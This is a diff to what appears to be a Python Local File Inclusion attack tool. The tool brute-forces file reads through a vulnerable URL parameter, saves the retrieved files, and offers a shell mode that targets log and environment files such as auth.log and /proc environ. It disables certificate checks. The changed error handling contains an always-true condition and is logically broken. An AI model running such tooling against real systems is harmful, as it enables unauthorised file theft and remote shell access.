@@ -12,7 +12,7 @@ import subprocess
 
 
 ssl._create_default_https_context = ssl._create_unverified_context  
-path = ('file://'+os.getcwd()+'/FileStore/').replace('\\n','')    
+path = ('file://'+os.getcwd()+'/FileStore').replace('\\n','')    
 class Local_File_In:
 
         def __init__(self,**kwargs) :          
@@ -215,13 +215,17 @@ class Local_File_In:
                         self._first_req = request.open(self.args.Vulnurl).read()                                                      
                         self.Get_Oregnal_URL = request.open(self.url).read()
                     except Exception  as e :
-                           print('\n' + '=' * 20 + "\n[*] ERROR INFORMATION\n" + '=' * 30 + '\n')
-                           print("[*] Error : ",e )
-                           print('\n' + '=' * 20 + "\n[*] ERROR INFORMATION\n" + '=' * 30 + '\n')
-                           print("[*] Use the following format ")
-                           print("[*] url Format : http/https://<ip>:<port>/<dir>")  
-                           print("[*] Example : http://10.10.10.193:4000/login.php?login=")
-                           exit()       
+                        if '404' or '500' in str(e):
+                            self.Get_Oregnal_URL = self.url
+                        else:    
+                            continue    
+                   # except Exception  as e :
+                    #       print('\n' + '=' * 20 + "\n[*] ERROR INFORMATION\n" + '=' * 30 + '\n')
+                     #      print("[*] Error : ",e )
+                      #     print('\n' + '=' * 20 + "\n[*] ERROR INFORMATION\n" + '=' * 30 + '\n')
+                      ##    print("[*] url Format : http/https://<ip>:<port>/<dir>")  
+                        #   print("[*] Example : http://10.10.10.193:4000/login.php?login=")
+                         #  exit()       
                     except KeyboardInterrupt:
                        exit()        
                     print('='*20+"\n[*] Brute force Method "+'\n'+'='*30+'\n')
@@ -240,7 +244,7 @@ class Local_File_In:
                     sys.stdout.write('\x1b[1A')
                     sys.stdout.write('\x1b[2K')
 
-                    if self.args.auth and len(self.Get_Oregnal_URL) > len(self._first_req) :                  
+                    if self.args.auth and len(self.Get_Oregnal_URL) > len(self._first_req) or self.args.auth and len(self.Get_Oregnal_URL) > 200 :                  
                       pythex = str(re.findall('Content-Length:.+',str(self.info)))
                       pythex= pythex.replace("['",'').replace("']",'')
                       if pythex in str(self.info):
@@ -265,7 +269,7 @@ class Local_File_In:
                         print("[+] File request        : ................ | : "+self.args.read.replace('\n','').replace("-","/")) 
                         print("[+] Full  URL           : ................ | : "+ self.url.replace('\n',''))
                         print("[+] File Name           : ................ | : "+self.args.read.replace('\\n',''))
-                        print("[+] save Locatoin       : ................ | : "+path+self.ip_re+"/"+self.args.read.replace('/','',1).replace('/','_').replace('\n',''))
+                        print("[+] save Locatoin       : ................ | : "+path+self.ip_re+"/"+self.args.read.replace('/','',1).replace('/','_').replace('\n','').strip())
                         if self.args.shell:
                                 if  "auth" in  self.url or "auth.log" in  self.url\
                                 or "environ" in self.url or "/apache2/php.ini" in self.url \
@@ -313,7 +317,7 @@ class Local_File_In:
                             exit()             
                         else:
                             exit()            
-                    elif not self.args.auth and len(self.Get_Oregnal_URL) > len(self._first_req) :
+                    elif not self.args.auth and len(self.Get_Oregnal_URL) > len(self._first_req) or len(self.Get_Oregnal_URL) > 200:
                         Local_File_In.file_name(self)
                         from Package.FileStore import FileManager
                         FileManager.FileRStore_Write(self,args=self.control)
